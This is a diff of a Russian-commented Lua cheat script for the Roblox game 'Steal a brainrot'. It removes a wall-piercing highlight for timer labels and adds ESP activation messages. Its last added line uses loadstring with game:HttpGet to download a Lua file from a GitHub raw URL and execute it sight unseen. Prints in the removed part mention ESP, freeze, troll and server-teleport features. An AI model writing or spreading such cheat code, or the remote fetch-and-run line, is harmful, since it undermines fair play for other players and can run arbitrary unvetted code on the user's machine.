-print("   - Отпускайте ПРОБЕЛ для БЫСТРОГО падения (скорость -80)")
-print("   - ВСЕ АНИМАЦИИ ПОЛНОСТЬЮ ОТКЛЮЧЕНЫ!")
-print("✅ ESP, Camera, Freeze, Troll - всё работает")
-print("✅ Телепорт по JobID: клавиша T")
-print("✅ Быстрый выбор инструментов: Z/X")
+-- Первоначальное сканирование
+updateESP(0)
 
--- == ДОБАВЛЕННЫЙ ВТОРОЙ СКРИПТ ==
--- Красивый фиолетовый скрипт для RemainingTime без черного фона
-local RunService = game:GetService("RunService")
-local highlightedObjects = {}
-
-local function createBeautifulPurpleRemainingTime()
-    for _, obj in pairs(workspace:GetDescendants()) do
-        if obj.Name == "RemainingTime" and obj.Parent and obj.Parent:IsA("BillboardGui") then
-            local billboardGui = obj.Parent
-            local remainingTimeLabel = obj
-            
-            if not highlightedObjects[billboardGui] then
-                -- Настройки BillboardGui для неограниченной видимости
-                billboardGui.MaxDistance = math.huge
-                billboardGui.AlwaysOnTop = true
-                billboardGui.Size = UDim2.new(12, 0, 6, 0)
-                billboardGui.StudsOffset = Vector3.new(0, 3, 0)
-                billboardGui.LightInfluence = 0  -- Не зависит от освещения
-                
-                if remainingTimeLabel:IsA("TextLabel") then
-                    -- Красивое оформление текста
-                    remainingTimeLabel.Size = UDim2.new(1, 0, 1, 0)
-                    remainingTimeLabel.BackgroundTransparency = 1  -- ПОЛНОСТЬЮ ПРОЗРАЧНЫЙ ФОН
-                    remainingTimeLabel.TextScaled = true
-                    remainingTimeLabel.RichText = true
-                    remainingTimeLabel.Font = Enum.Font.GothamBold
-                    
-                    -- ФИОЛЕТОВЫЕ ЦВЕТА
-                    remainingTimeLabel.TextColor3 = Color3.new(0.8, 0.4, 1)      -- Ярко-фиолетовый текст
-                    remainingTimeLabel.TextStrokeTransparency = 0                -- Включаем обводку
-                    remainingTimeLabel.TextStrokeColor3 = Color3.new(0.3, 0, 0.6) -- Темно-фиолетовая обводка
-                    
-                    -- Размеры текста
-                    local constraint = remainingTimeLabel:FindFirstChild("UITextSizeConstraint")
-                    if constraint then
-                        constraint:Destroy()
-                    end
-                    
-                    local newConstraint = Instance.new("UITextSizeConstraint")
-                    newConstraint.MaxTextSize = 600
-                    newConstraint.MinTextSize = 250
-                    newConstraint.Parent = remainingTimeLabel
-                    
-                    -- Добавляем красивый градиент
-                    local gradient = Instance.new("UIGradient")
-                    gradient.Color = ColorSequence.new{
-                        ColorSequenceKeypoint.new(0, Color3.new(1, 0.5, 1)),      -- Светло-фиолетовый сверху
-                        ColorSequenceKeypoint.new(0.5, Color3.new(0.8, 0.3, 1)),  -- Средне-фиолетовый в середине
-                        ColorSequenceKeypoint.new(1, Color3.new(0.5, 0, 0.8))     -- Темно-фиолетовый снизу
-                    }
-                    gradient.Rotation = 90  -- Вертикальный градиент
-                    gradient.Parent = remainingTimeLabel
-                end
-                
-                -- ФИОЛЕТОВАЯ ПОДСВЕТКА
-                local highlight = Instance.new("Highlight")
-                highlight.Name = "RemainingTimeHighlight"
-                highlight.FillColor = Color3.new(0.7, 0.2, 1)        -- Фиолетовая заливка
-                highlight.FillTransparency = 0.4                      -- Полупрозрачная
-                highlight.OutlineColor = Color3.new(1, 0.8, 1)       -- Светло-фиолетовая обводка
-                highlight.OutlineTransparency = 0                     -- Непрозрачная обводка
-                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-                highlight.Adornee = billboardGui
-                highlight.Parent = billboardGui
-                
-                highlightedObjects[billboardGui] = true
-                print("Создан красивый фиолетовый RemainingTime:", billboardGui:GetFullName())
-            end
-        end
-    end
-end
-
--- Запуск
-createBeautifulPurpleRemainingTime()
-
--- Автообновление
-workspace.DescendantAdded:Connect(function(descendant)
-    if descendant.Name == "RemainingTime" then
-        wait(0.2)
-        createBeautifulPurpleRemainingTime()
-    end
-end)
+print("Steal a brainrot ESP System активирован!")
+print("Отслеживается объектов: "..#OBJECT_NAMES)
+print("ID сервера:", getServerId())
+print("\nНажмите F для сканирования всех объектов")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
